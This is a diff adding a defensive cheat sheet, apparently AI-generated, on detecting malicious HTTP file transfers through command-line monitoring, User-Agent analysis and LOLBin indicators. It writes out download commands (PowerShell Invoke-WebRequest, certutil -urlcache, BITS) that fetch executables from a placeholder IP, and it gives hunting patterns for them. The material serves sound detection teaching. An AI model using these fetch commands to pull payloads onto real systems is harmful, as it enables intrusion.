@@ -381,21 +381,284 @@ Unusual methods can indicate malicious activity.
 - Behavior-based detection > signature-based blocking
     
 - Build environment baseline first
+
+# 🛡 File Transfer Detection – Ultra Practical Cheat Sheet
+
+---
+
+## 🎯 Goal
+
+Detect malicious file transfers over HTTP/HTTPS using:
+
+- Command-line monitoring
+    
+- User-Agent analysis
+    
+- Protocol behavior
+    
+- LOLBin usage detection
     
 
 ---
 
-If you'd like next:
+# 1️⃣ Command-Line Detection
 
-- 📝 One-page detection cheat sheet
+### ❌ Blacklisting (Weak)
+
+- Easy to bypass
     
-- 📊 Exam-focused ultra-compact sheet
+- Case changes
     
-- 🔥 Red team evasion version
+- Encoding
     
-- 🛡 Blue team hunting playbook
-    
-- 🧠 Interview prep sheet
+- Renamed binaries
     
 
-Just tell me which format you want.
+---
+
+### ✅ Whitelisting (Strong)
+
+- Allow known-good command lines only
+    
+- Alert on deviations
+    
+- Best enterprise approach
+    
+
+Example:
+
+```id="cb24xw"
+Allow certutil.exe only for Windows Update
+Alert on all other usage
+```
+
+---
+
+# 2️⃣ HTTP User-Agent Detection
+
+### 🧠 Key Concept
+
+Every HTTP client sends a **User-Agent string**.
+
+Detect suspicious tools by their User-Agent.
+
+---
+
+## 🔎 Common Malicious Transfer User-Agents
+
+|Tool|User-Agent Seen on Server|Detection Clue|
+|---|---|---|
+|Invoke-WebRequest|WindowsPowerShell/5.x|PowerShell download|
+|WinHttpRequest|WinHttp.WinHttpRequest|COM-based transfer|
+|Msxml2.XMLHTTP|MSIE 7.0 / Trident|Script-based abuse|
+|Certutil|Microsoft-CryptoAPI|LOLBin misuse|
+|BITS|Microsoft BITS/x|Background job abuse|
+
+---
+
+# 3️⃣ PowerShell Download Indicators
+
+### Invoke-WebRequest
+
+```powershell
+Invoke-WebRequest http://IP/file.exe -OutFile file.exe
+```
+
+Server sees:
+
+```id="yi0p5a"
+User-Agent: WindowsPowerShell/5.x
+```
+
+---
+
+### WinHttpRequest
+
+```powershell
+new-object -com WinHttp.WinHttpRequest.5.1
+```
+
+Server sees:
+
+```id="9tb974"
+User-Agent: WinHttp.WinHttpRequest
+```
+
+---
+
+### Msxml2
+
+```powershell
+New-Object -ComObject Msxml2.XMLHTTP
+```
+
+Server sees:
+
+```id="xjp7ax"
+User-Agent: MSIE 7.0; Trident
+```
+
+---
+
+# 4️⃣ LOLBin Detection
+
+### Certutil
+
+```cmd
+certutil -urlcache -split -f http://IP/file.exe
+```
+
+Server sees:
+
+```id="4rqira"
+User-Agent: Microsoft-CryptoAPI/10.0
+```
+
+---
+
+### BITS
+
+```powershell
+Start-BitsTransfer http://IP/file.exe
+```
+
+Server sees:
+
+```id="tlcybj"
+User-Agent: Microsoft BITS/x
+```
+
+Often sends:
+
+```id="fxxe06"
+HEAD requests before GET
+```
+
+---
+
+# 5️⃣ Suspicious HTTP Methods
+
+Watch for unusual methods:
+
+```id="2xrk10"
+POST requests
+```
+
+Common in:
+
+- certreq uploads
+    
+- Exfiltration tools
+    
+- Custom scripts
+    
+
+Also monitor:
+
+- Unexpected `PUT`
+    
+- Unusual `HEAD`
+    
+- Executable downloads over HTTP
+    
+
+---
+
+# 6️⃣ High-Value Detection Rules
+
+Alert if:
+
+- PowerShell downloads EXE over HTTP
+    
+- Certutil contacts external IP
+    
+- BITS runs from user context
+    
+- Browser-like UA from server process
+    
+- Rare user agent not in whitelist
+    
+- Large outbound transfer to unknown host
+    
+
+---
+
+# 7️⃣ What to Baseline First
+
+Build allow-list for:
+
+- Chrome / Edge / Firefox
+    
+- Windows Update
+    
+- AV updates
+    
+- Internal tools
+    
+- Patch management systems
+    
+
+Everything else → investigate.
+
+---
+
+# 8️⃣ Detection Pipeline Overview
+
+![Image](https://www.logsign.com/uploads/13_1_6cb8094ab7.png)
+
+![Image](https://www.comodo.com/images/ids-in-security.png)
+
+![Image](https://media.licdn.com/dms/image/v2/C4D12AQETnFUwdt7XXw/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1588737695532?e=2147483647&t=Co1NlyGtv5GRtuz00Dq9-z0FBn78C8JyDMbSWu0Ds04&v=beta)
+
+![Image](https://media.licdn.com/dms/image/v2/C4D12AQGb1eW4d2Mixw/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1588736349379?e=1770249600&t=NmLiNR6Fn8KJZp-rHmjYUwjbTX7QMFnPXCdq5mtMBYI&v=beta)
+
+**Flow:**
+
+1. Endpoint logs command line
+    
+2. Firewall logs HTTP request
+    
+3. IDS inspects headers
+    
+4. SIEM correlates:
+    
+    - User-Agent
+        
+    - Process
+        
+    - Destination
+        
+5. Alert on anomaly
+    
+
+---
+
+# 9️⃣ Quick Hunting Queries (Conceptual)
+
+Hunt for:
+
+- `WindowsPowerShell` in proxy logs
+    
+- `Microsoft-CryptoAPI`
+    
+- `Microsoft BITS`
+    
+- Rare User-Agent strings
+    
+- HTTP downloads of `.exe`, `.ps1`, `.dll`
+    
+- Internal host reaching unknown IP over 80
+    
+
+---
+
+# 🔟 Exam Key Points
+
+✔ Blacklisting = bypassable  
+✔ Whitelisting = robust  
+✔ User-Agent hunting = powerful  
+✔ LOLBins still leave network artifacts  
+✔ Behavior-based detection > signature detection  
+✔ HTTP is most common transfer channel
+
+---
